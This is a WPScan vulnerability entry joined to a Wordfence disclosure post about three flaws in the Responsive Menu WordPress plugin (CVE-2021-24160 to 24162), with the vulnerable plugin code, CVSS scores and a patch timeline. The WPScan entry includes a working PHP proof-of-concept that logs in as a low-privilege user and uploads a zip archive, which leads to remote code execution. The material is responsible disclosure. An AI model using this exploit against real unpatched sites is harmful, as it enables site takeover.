=== Content from wpscan.com_30670108_20250115_090155.html ===


[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# Responsive Menu 4.0.0 - 4.0.3 - Authenticated Arbitrary File Upload

### Description

"A subscriber could upload zip archives containing malicious PHP files that would get extracted to the /rmp-menu/themes/ directory. These files could then be accessed via the front end of the site to trigger remote code execution and ultimately allow an attacker to execute commands to further infect a WordPress site."

### Proof of Concept

<?php
// Settings
$wp\_url = $argv[1];
$wp\_user = $argv[2];
$wp\_pass = $argv[3];
$upfile = $argv[4];
// 1) Log in as customer
$ch = curl\_init();
$cookiejar = tempnam(sys\_get\_temp\_dir(), 'cookiejar-');
curl\_setopt($ch, CURLOPT\_URL, $wp\_url . '/wp-login.php');
curl\_setopt($ch, CURLOPT\_COOKIEJAR, $cookiejar);
curl\_setopt($ch, CURLOPT\_COOKIEFILE, $cookiejar);
curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, true);
curl\_setopt($ch, CURLOPT\_FOLLOWLOCATION, true);
curl\_setopt($ch, CURLOPT\_POST, true);
curl\_setopt($ch, CURLOPT\_POSTFIELDS, [
'log' => $wp\_user,
'pwd' => $wp\_pass,
'rememberme' => 'forever',
'wp-submit' => 'Log+In',
]);
$output = curl\_exec($ch);
curl\_close($ch);
// Update Settings
$ch = curl\_init();
$cFile = curl\_file\_create( realpath( $upfile ) );
curl\_setopt($ch, CURLOPT\_URL, $wp\_url . '/wp-admin/admin-post.php');
curl\_setopt($ch, CURLOPT\_COOKIEJAR, $cookiejar);
curl\_setopt($ch, CURLOPT\_COOKIEFILE, $cookiejar);
curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, true);
curl\_setopt($ch, CURLOPT\_FOLLOWLOCATION, true);
curl\_setopt($ch, CURLOPT\_POST, true);
curl\_setopt($ch, CURLOPT\_POSTFIELDS, [
'action' => 'rmp\_upload\_theme\_file',
'file' => $cFile,
]);
$output = curl\_exec($ch);
curl\_close($ch);
print\_r($output);
?>

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

responsive-menu](https://a8cteam5105.wordpress.com/plugin/responsive-menu/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 4.0.4

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

responsive-menu-pro](https://a8cteam5105.wordpress.com/plugin/responsive-menu-pro/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 4.0.4

### References

CVE
[CVE-2021-24160](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24160)

URL
<https://www.wordfence.com/blog/2021/02/multiple-vulnerabilities-patched-in-responsive-menu-plugin/>

### Miscellaneous

Original Researcher
Chloe Chamberland

Submitter
Chloe Chamberland

Submitter website
<https://wordfence.com>

Submitter twitter
[infosecchloe](//twitter.com/infosecchloe)

Verified
No

WPVDB ID
[066ba5d4-4aaa-4462-b106-500c1f291c37](https://a8cteam5105.wordpress.com/vulnerability/066ba5d4-4aaa-4462-b106-500c1f291c37/)

### Timeline

Publicly Published
2021-02-10 (about 3 years ago)

Added
2021-02-10 (about 3 years ago)

Last Updated
2021-04-07 (about 3 years ago)

### Other

Published
Title

Published
2012-06-05
Title
[Member Private Conversation < 1.4 - Unrestricted File Upload](https://a8cteam5105.wordpress.com/vulnerability/7df0e867-494e-444b-aa98-33ea51714a15/)

Published
2025-01-03
Title
[JobBoard Job listing < 1.2.7 - Unauthenticated Arbitrary File Upload](https://a8cteam5105.wordpress.com/vulnerability/e35e43fa-91f0-455f-bf61-b9638e930515/)

Published
2014-08-01
Title
[Oxygen - Remote File Upload](https://a8cteam5105.wordpress.com/vulnerability/abfe0b5b-a541-45f5-8cd1-b7922e784064/)

Published
2024-11-08
Title
[Computer Repair Shop < 3.8116 - Unauthenticated Arbitrary File Upload](https://a8cteam5105.wordpress.com/vulnerability/b2e75c52-7c06-4733-b7a3-0f2e5c6f001b/)

Published
2015-10-29
Title
[WordPress File Upload <= 3.4.0 - Unauthenticated Malicious File Upload](https://a8cteam5105.wordpress.com/vulnerability/32e34cff-d6cf-4e00-bb5d-1e2e6595f1c1/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)


=== Content from www.wordfence.com_ed5dad2b_20250115_090156.html ===


![](https://www.wordfence.com/wp-content/uploads/2021/02/Multiple-Vulnerabilities-Patched-in-Responsive-Menu-Plugin.jpg)

[![](https://secure.gravatar.com/avatar/9bf72594e071c28445ed7a1be0de1a23?s=80&d=mm&r=g)Chloe Chamberland](https://www.wordfence.com/blog/author/wfchloe/)

February 10, 2021

# Multiple Vulnerabilities Patched in Responsive Menu Plugin

On December 17, 2020, our Threat Intelligence team responsibly disclosed three vulnerabilities in [Responsive Menu](https://wordpress.org/plugins/responsive-menu/), a WordPress plugin installed on over 100,000 sites. The first flaw made it possible for authenticated attackers with low-level permissions to upload arbitrary files and ultimately achieve remote code execution. The remaining two flaws made it possible for attackers to forge requests that would modify the settings of the plugin and again upload arbitrary files that could lead to remote code execution. All three vulnerabilities could lead to a site takeover, which could have consequences including backdoors, spam injections, malicious redirects, and other malicious activities.

We initially attempted to reach out to the team at Responsive Menu through their parent company ExpressTech on December 17, 2020 . After receiving no response for a few weeks, we tried reaching out through the contact form on the Responsive Menu site on January 4, 2021, and again received no response after a week. At that point we felt it best to escalate the issue to the WordPress Plugins team on January 10, 2021. We received a response from the plugins team and the plugin’s founder thereafter on January 11, 2021. Once contact was established, they were very quick to resolve the issues and released a patch on January 19, 2021.

All three patched flaws are considered medium and critical severity vulnerabilities. Therefore, we highly recommend updating to the patched version, 4.0.4, immediately.

Wordfence Premium users received a firewall rule to protect against any exploits targeting these vulnerabilities on December 17, 2020. Sites still using the free version of Wordfence received the same protection on January 16, 2021.

**Description:** Authenticated Arbitrary File Upload

**Affected Plugin:** Responsive Menu

**Plugin Slug:** responsive-menu

**Affected Versions:** < = 4.0.0 – 4.0.3

**CVE ID:** [CVE-2021-24160](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24160)

**CVSS Score:** 9.9 (Critical)

**CVSS Vector:**[CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)

**Fully Patched Version:** 4.0.4

Responsive Menu is a plugin designed to create highly responsive and customizable menus for WordPress sites. It contains several features that allow users to easily create a beautiful menu interface with different colors and designs. As part of the plugin’s functionality, site owners have the option to import themes from zip files that can either by custom creations or downloaded from the Responsive Menu site. In order to provide this functionality, the plugin registered an admin\_post action, `admin_post_rmp_upload_theme_file`, tied to the function `rmp_upload_theme`.

```
 add_action('admin_post_rmp_upload_theme_file', array( $this, 'rmp_upload_theme' ) );
```

The `rmp_upload_theme` function takes a zip file supplied by the `admin_post` request and extracts its contents to the `/rmp-menu/themes/` directory.

```
    public function rmp_upload_theme() {
		status_header(200);
		$theme = $_FILES['file']['tmp_name'];
		WP_Filesystem();
		$upload_dir = wp_upload_dir()['basedir'] . '/rmp-menu/themes/';
		$unzip_file = unzip_file( $theme , $upload_dir );
		if ( is_wp_error( $unzip_file ) ) {
			$status = ['danger' => $unzip_file->get_error_message() ];
		} else {
			$status = [ 'success' => 'Theme Imported Successfully.'];
		}
		return $status;
	}

```

Unfortunately, there were no capability checks on this function, and due to the fact that it used admin\_post, any user logged into a vulnerable WordPress site could execute this action to trigger the file upload and zip extraction. This included subscribers and other low level users, making sites with open registration particularly vulnerable. The `admin_post` action does not check to see whether a user is an administrator, but rather if the user is sending a request to the administrative page `/wp-admin/admin-post.php` while authenticated.

A subscriber could upload zip archives containing malicious PHP files that would get extracted to the `/rmp-menu/themes/` directory. These files could then be accessed via the front end of the site to trigger remote code execution and ultimately allow an attacker to execute commands to further infect a WordPress site.

In addition, there were no nonce checks on this function making it vulnerable to Cross-Site Request Forgery attempts as well.

*This feature was introduced in version 4.0.0 of the plugin, therefore, only site running versions 4.0.0 – 4.0.3 of this plugin are considered vulnerable.*

**Description:** Cross Site Request Forgery to Arbitrary File Upload

**Affected Plugin:** Responsive Menu

**Plugin Slug:** responsive-menu

**Affected Versions:** < = 4.0.3

**CVE ID:** [CVE-2021-24161](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24161)

**CVSS Score:** 8.8 (High)

**CVSS Vector:** [CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H)

**Fully Patched Version:** 4.0.4

Prior to the major overhaul of the plugin in version 4.0.0, the theme import function was integrated within the settings area instead of using standalone functionality. The plugin received a POST request with the `responsive-menu-import-theme` parameter and file contents in the `responsive-menu-import-theme-file` parameter on the responsive-menu page.

```
              elseif(isset($_POST['responsive-menu-import-theme'])):
                    $file = $_FILES['responsive-menu-import-theme-file'];
                    $theme = isset($file['tmp_name']) && $file['tmp_name'] ? $file['tmp_name'] : null;

                    echo $controller->import_theme($theme);

```

If the `responsive-menu-import-theme` parameter was sent in a request, it triggered the `import_theme` function to start a theme import. This involved uploading and extracting the files from the supplied zip archive to the `/responsive-menu-themes` folder.

```
    public function import_theme($theme) {
        if($theme):
            WP_Filesystem();
            $upload_folder = wp_upload_dir()['basedir'] . '/responsive-menu-themes';

            $unzipfile = unzip_file($theme, $upload_folder);

            if(is_wp_error($unzipfile)) {
                $alert = ['danger' => $unzipfile->get_error_message()];
            } else {
                $alert = ['success' => 'Responsive Menu Theme Imported Successfully.'];
            }

```

Though there was a permission check on this functionality that made it so that only administrators could trigger a theme import, there were no nonce checks to verify that a request came from a currently authenticated administrator’s session. This meant that attackers could craft a request and trick an administrator into uploading a zip archive containing malicious PHP files. The attacker could then access those files to achieve remote code execution and further infect the targeted site.

*Since this plugin underwent a major overhaul, this is considered a legacy feature. Only sites running versions older than 4.0.0 or running in legacy mode on versions 4.0.0 – 4.0.3 are considered vulnerable.*

**Description:** Cross Site Request Forgery to Setting Modification

**Affected Plugin:** Responsive Menu

**Plugin Slug:** responsive-menu

**Affected Versions:** < = 4.0.3

**CVE ID:** [CVE-2021-24162](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24162)

**CVSS Score:** 5.4 (Medium)

**CVSS Vector:** [CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:L](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:L)

Fully Patched Version: 4.0.4

In addition to the theme import functionality, the plugin contained the ability to import new settings. The plugin checks for a POST request with the `responsive-menu-import` parameter and file contents in the `responsive-menu-import-file` parameter on the responsive-menu page.

```
            elseif(isset($_POST['responsive-menu-import'])):
                    $file = $_FILES['responsive-menu-import-file'];
                    $file_options = isset($file['tmp_name']) ? (array) json_decode(file_get_contents($file['tmp_name'])) : null;
                    echo $controller->import($file_options);

```

If the `responsive-menu-import-file` parameter was sent in a request, it would trigger the import function to start a settings import. This would then trigger the `updateOptions` function to update any of the options set for the plugin stored in the `responsive_menu` table.

```
   public function import($imported_options) {
        $errors = [];
        if(!empty($imported_options)):

            $validator = new Validator();
            if($validator->validate($imported_options)):
                try {
                    unset($imported_options['button_click_trigger']);
                    $options = $this->manager->updateOptions($imported_options);
                    $task = new UpdateOptionsTask;
                    $task->run($options, $this->view);
                    $alert = ['success' => 'Responsive Menu Options Imported Successfully.'];

```

Again, although there was a permission check on this functionality restricting settings import to administrators, there were no nonce checks to verify that a request came from a currently authenticated administrator’s session. This meant that attackers could craft a request and trick an administrator into importing all new settings. These settings could be modified to include malicious JavaScript, therefore allowing an attacker to inject payloads that could aid in further infection of the site.

*Since this plugin underwent a major overhaul, this is considered a legacy feature. Only sites running versions older than 4.0.0 or running in legacy mode on versions 4.0.0 – 4.0.3 are considered vulnerable.*

## Disclosure Timeline

* **December 17, 2020** – Conclusion of the plugin analysis that led to the discovery of the three vulnerabilities. We develop firewall rules to protect Wordfence customers and release them to Wordfence Premium users. We make our initial contact attempt via the ExpressTech.io contact form.
* **January 4, 2021** – We make a second contact attempt, this time via the contact form on the Responsive Menu website.
* **January 10, 2021** – We escalate the issue to the WordPress plugins team and provide full details at the time of reporting.
* **January 11, 2021** – We receive a response from the WordPress plugins team and the founder of Responsive Menu. They verify that they will begin working on a fix.
* **January 15, 2021** – Responsive Menu provides us with a copy of the intended patch to test. We verify it is sufficient and request additional security enhancements to be added.
* **January 16, 2021** – Free Wordfence users receive firewall rules.
* **January 18, 2021** – A patched version of the plugin is released as version 4.0.4. We verify again that the vulnerabilities have been patched.

## Conclusion

In today’s post, we detailed three flaws in the Responsive Menu plugin that granted attackers the ability to achieve remote code execution through arbitrary file uploads and to change settings. These flaws have been fully patched in version 4.0.4. We recommend that users immediately update to the latest version available, which is version 4.0.4 at the time of this publication.

[Wordfence Premium](https://www.wordfence.com/wordfence-signup/?promo_id=blog20210210&promo_name=get-premium&promo_creative=txt&promo_position=conclusion) users received firewall rules protecting against this vulnerability on December 17, 2020, while those still using the free version of Wordfence received the same protection on January 16, 2021.

If you know a friend or colleague who is using this plugin on their site, we highly recommend forwarding this advisory to them to help keep their sites protected as these are considered critical severity issues that can result in remote code execution.

*Note: We have requested that the plugin’s owner add further security hardening to the import of zip files. Though we received confirmation from the plugin owner that they would work on implementing this, it has been nearly a month with no visible progress on this request. Given the severity of the vulnerabilities already patched, we are publishing this advisement now so that site owners can update and protect their sites. We consider the remaining issue of significantly lower impact, as it would only affect very rare WordPress installations. We anticipate that they will soon resolve this issue, and we will update this post when completed.*

Search

### Trust Your Site to the Leader in WordPress Security

Wordfence includes an endpoint firewall, malware scanner, robust login security features, live traffic views, and more. Discover why over 5 million WordPress sites put their trust in Wordfence.

[Protect Your Site](/products/pricing/)

**Did you enjoy this post? Share it!**

[*Facebook*](http://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.wordfence.com%2Fblog%2F2021%2F02%2Fmultiple-vulnerabilities-patched-in-responsive-menu-plugin%2F)
[*Twitter*](https://twitter.com/share?url=https%3A%2F%2Fwww.wordfence.com%2Fblog%2F2021%2F02%2Fmultiple-vulnerabilities-patched-in-responsive-menu-plugin%2F&text=Multiple%20Vulnerabilities%20Patched%20in%20Responsive%20Menu%20Plugin&via=wordfence)
[*LinkedIn*](https://www.linkedin.com/shareArticle?url=https%3A%2F%2Fwww.wordfence.com%2Fblog%2F2021%2F02%2Fmultiple-vulnerabilities-patched-in-responsive-menu-plugin%2F)

## Comments

5 Comments

* ![](https://secure.gravatar.com/avatar/552f5bfcbb365f6ccd5fb1b38ea478d9?s=96&d=mm&r=g)
  Craig Paterson
  February 10, 2021
   8:41 am

  Does this affect the Pro version of the Responsive Menu plugin? Or is it just the free version in the WordPress repository?

+ ![](https://secure.gravatar.com/avatar/9bf72594e071c28445ed7a1be0de1a23?s=96&d=mm&r=g)
  Chloe Chamberland
  February 10, 2021
   2:29 pm

  Hi Craig,

  This does affect both the PRO and free versions of this plugin. These issues have been resolved in the same version (4.0.4) for both.

- ![](https://secure.gravatar.com/avatar/552f5bfcbb365f6ccd5fb1b38ea478d9?s=96&d=mm&r=g)
  Craig Paterson
  February 11, 2021
   8:42 am

  Hi Chloe, thanks for that, but the latest available Pro version from their website is responsive-menu-pro-3.1.30

* ![](https://secure.gravatar.com/avatar/9bf72594e071c28445ed7a1be0de1a23?s=96&d=mm&r=g)
  Chloe Chamberland
  February 15, 2021
   12:29 pm

  Hi Craig,

  I was able to install 4.0.4 directly from their site for the PRO version, however, that was during a new sign-up. I recommend reaching out directly to their support team to see why that may be the case for you.

* ![](https://secure.gravatar.com/avatar/87c403cc0b18f4002fbdc8a6cf29f140?s=96&d=mm&r=g)
  suraj singh
  February 24, 2021
   2:17 am

  Hello Guys

  The responsive menu team has fixed all the vulnerabilities on all the versions include free.

  They will provide you an updated one.

### Breaking WordPress Security Research in your inbox as it happens.

![Example of a news story](/img/footer-news-example.jpg)

This site uses cookies in accordance with our [Privacy Policy](/privacy-policy).

Cookie Settings
Accept All

## Cookie Options

For additional information on how this site uses cookies, please review our [Privacy Policy](/privacy-policy). The cookies used by this site are classified into the following categories and can be configured below.

### Strictly Necessary

These Cookies are necessary for the Sites and Services to work properly. They include any essential authentication and authorization cookies for the Services.

\* Cookies of this category are necessary for the site to function and cannot be disabled.

### Performance/Analytical

These Cookies allow us to collect certain information about how you navigate the Sites or utilize the Services running on your device. They help us understand which areas you use and what we can do to improve them.

### Targeting

These Cookies are used to deliver relevant information related to the Services to an identified machine or other device (not a named or otherwise identifiable person) which has previously been used to visit our Sites. Some of these types of Cookies on our Sites are operated by third parties with our permission and are used to identify advertising sources that are effectively driving customers to our Sites.

Cancel
Save


